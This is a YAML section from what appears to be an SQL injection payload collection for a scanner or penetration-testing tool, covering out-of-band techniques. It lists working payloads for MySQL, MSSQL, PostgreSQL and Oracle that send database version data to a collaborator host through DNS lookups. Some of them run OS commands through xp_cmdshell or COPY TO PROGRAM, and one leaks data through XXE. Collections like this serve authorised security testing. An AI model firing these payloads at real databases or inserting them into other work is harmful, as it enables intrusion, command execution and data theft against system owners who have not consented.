###############################################################################
# 7. OUT-OF-BAND (OAST) INJECTION
###############################################################################
oast:
  mysql:
    - payload: "SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.{COLLABORATOR}.oastify.com\\\\\\\\a'))"
      description: "MySQL OOB — version via DNS to Collaborator"
      technique: "dns_exfil"
      requires: "collaborator_domain"
    - payload: "SELECT * FROM users INTO OUTFILE CONCAT('\\\\\\\\',(SELECT @@version),'.{COLLABORATOR}.oastify.com\\\\\\\\a')"
      description: "MySQL OOB — INTO OUTFILE DNS"
      technique: "dns_exfil"
      requires: "collaborator_domain"
    - payload: "' AND LOAD_FILE('\\\\\\\\{COLLABORATOR}.oastify.com\\\\\\\\a') -- -"
      description: "MySQL OOB — LOAD_FILE DNS lookup"
      technique: "dns_lookup"
      requires: "collaborator_domain"

  mssql:
    - payload: "EXEC master..xp_dirtree '//{COLLABORATOR}.oastify.com/a'"
      description: "MSSQL OOB — xp_dirtree DNS"
      technique: "dns_exfil"
      requires: "collaborator_domain"
      tag: "classic"
    - payload: "DECLARE @q varchar(1024); SET @q='\\\\'+(SELECT @@version)+'.{COLLABORATOR}.oastify.com\\a'; EXEC master..xp_dirtree @q"
      description: "MSSQL OOB — version via xp_dirtree"
      technique: "dns_exfil"
      requires: "collaborator_domain"
    - payload: "EXEC master..xp_cmdshell 'nslookup {COLLABORATOR}.oastify.com'"
      description: "MSSQL OOB — xp_cmdshell DNS"
      technique: "dns_exfil"
      requires: "collaborator_domain,xp_cmdshell"

  postgresql:
    - payload: "COPY (SELECT '') TO PROGRAM 'nslookup {COLLABORATOR}.oastify.com'"
      description: "PostgreSQL OOB — COPY PROGRAM DNS"
      technique: "dns_exfil"
      requires: "collaborator_domain,superuser"
      tag: "classic"
    - payload: "CREATE OR REPLACE FUNCTION f() RETURNS void AS $$ DECLARE c text; DECLARE p text; BEGIN SELECT INTO p (SELECT version()); c := 'copy (SELECT '''') to program ''nslookup '||p||'.{COLLABORATOR}.oastify.com'''; EXECUTE c; END; $$ LANGUAGE plpgsql SECURITY DEFINER; SELECT f()"
      description: "PostgreSQL OOB — version via function DNS"
      technique: "dns_exfil"
      requires: "collaborator_domain,superuser"

  oracle:
    - payload: "SELECT UTL_INADDR.get_host_address('{COLLABORATOR}.oastify.com') FROM dual"
      description: "Oracle OOB — UTL_INADDR DNS"
      technique: "dns_lookup"
      requires: "collaborator_domain"
    - payload: "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://'||(SELECT banner FROM v$version)||'.{COLLABORATOR}.oastify.com/\"> %remote;]>'),'/l') FROM dual"
      description: "Oracle OOB — XXE DNS exfil with version"
      technique: "xxe_dns_exfil"
      requires: "collaborator_domain"

